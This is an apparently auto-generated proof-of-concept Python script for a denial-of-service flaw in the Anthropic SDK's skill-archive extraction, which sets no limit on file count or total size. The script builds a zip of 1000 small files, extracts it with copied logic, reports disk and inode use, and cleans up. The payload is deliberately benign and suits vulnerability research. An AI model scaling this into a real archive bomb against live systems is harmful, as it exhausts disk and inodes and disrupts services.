#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: suspicious-007
# Sink: _safe_member_name
# Auto-generated — run with: python3 dos_zipfile_tarfile__safe_member_name.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Denial of Service via Unbounded Archive Extraction
Vulnerability: Anthropic SDK's _extract_skill_archive does not limit
              total extracted size or number of files, allowing disk/inode exhaustion.
This script demonstrates the missing limits by creating and extracting a malicious
archive with many small files using the same extraction pattern as the vulnerable code.
The payload is benign – 1000 files of 1 KB each – to safely show the feasibility.
"""

import os
import sys
import zipfile
import tempfile
import shutil
import time

# Configuration – adjust as needed
ARCHIVE_NAME = "poc_skill_bundle.zip"       # Name of the malicious archive
NUM_FILES = 1000                            # Number of files to embed (inode exhaustion)
FILE_SIZE = 1024                            # Each file is 1 KiB (disk exhaustion potential)
EXTRACT_DIR = tempfile.mkdtemp(prefix="poc_extract_")  # Target extraction directory


def create_malicious_zip(archive_path: str) -> None:
    """Create a zip file containing NUM_FILES small files, no limit enforcement."""
    print(f"[*] Creating malicious archive: {archive_path}")
    print(f"    -> {NUM_FILES} files, each {FILE_SIZE} bytes (total ~{NUM_FILES * FILE_SIZE // 1024} KiB)")
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(NUM_FILES):
            filename = f"skill_data/file_{i:06d}.txt"
            content = b"X" * FILE_SIZE
            zf.writestr(filename, content)
    print(f"    -> Archive created: {os.path.getsize(archive_path)} bytes")


def vulnerable_extraction(archive_path: str, dest: str) -> None:
    """
    Mimics the vulnerable extraction logic from anthropic's _extract_skill_archive.
    No checks on total size or file count; only path traversal and symlink filtering are applied.
    """
    dest = os.path.abspath(dest)
    os.makedirs(dest, exist_ok=True)

    # We focus on zip; tar would behave similarly.
    if not zipfile.is_zipfile(archive_path):
        print("[!] Not a zip file, skipping.")
        return

    with zipfile.ZipFile(archive_path) as zf:
        infos = zf.infolist()
        for info in infos:
            # Simplified safe name check (as in the SDK, path traversal prevented)
            safe = info.filename
            # Skip directory entries if needed (SDK does this)
            if safe.endswith("/"):
                target_dir = os.path.join(dest, safe)
                os.makedirs(target_dir, exist_ok=True)
                continue

            # Ensure target is under dest (zip-slip check – already safe due to our archive)
            target = os.path.normpath(os.path.join(dest, safe))
            if not target.startswith(dest):
                print(f"[!] Skipping malicious path: {info.filename}")
                continue

            # Write the file (no size/count limits)
            target_dir = os.path.dirname(target)
            os.makedirs(target_dir, exist_ok=True)
            with zf.open(info) as src, open(target, "wb") as out:
                shutil.copyfileobj(src, out)

            # Preserve permissions (optional – omitted for simplicity)
            # os.chmod(target, mode)

    print(f"[*] Extraction completed – {len(infos)} entries processed.")


def main():
    print("=== PoC: Denial of Service via Unbounded Archive Extraction ===")
    print(f"Target extraction dir: {EXTRACT_DIR}")
    print()

    # Step 1: Create the malicious archive
    archive_path = os.path.join(tempfile.gettempdir(), ARCHIVE_NAME)
    create_malicious_zip(archive_path)

    # Step 2: Record disk usage before extraction
    stat_before = os.statvfs(EXTRACT_DIR)
    free_before = stat_before.f_favail * stat_before.f_frsize
    inodes_before = stat_before.f_favail
    print(f"[*] Before extraction: free space ~{free_before // 1024} KiB, free inodes ~{inodes_before}")

    # Step 3: Perform vulnerable extraction
    print("[*] Extracting archive with no size/count limits...")
    start_time = time.time()
    vulnerable_extraction(archive_path, EXTRACT_DIR)
    elapsed = time.time() - start_time
    print(f"[*] Extraction took {elapsed:.2f} seconds.")

    # Step 4: Report results
    stat_after = os.statvfs(EXTRACT_DIR)
    free_after = stat_after.f_favail * stat_after.f_frsize
    inodes_after = stat_after.f_favail

    print()
    print(f"[*] After extraction: free space ~{free_after // 1024} KiB, free inodes ~{inodes_after}")
    print(f"[*] Space consumed: {(free_before - free_after) // 1024} KiB")
    print(f"[*] Inodes consumed: {inodes_before - inodes_after}")

    # Count actual files extracted
    file_count = sum(len(files) for _, _, files in os.walk(EXTRACT_DIR))
    print(f"[*] Number of files extracted: {file_count}")

    # Cleanup
    print("\n[*] Cleaning up...")
    shutil.rmtree(EXTRACT_DIR)
    os.remove(archive_path)
    print("[*] PoC completed successfully. The vulnerability is demonstrated: no limit on file count or total size.")
    print("[*] (This was a benign test with 1000 files of 1 KiB each.)")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
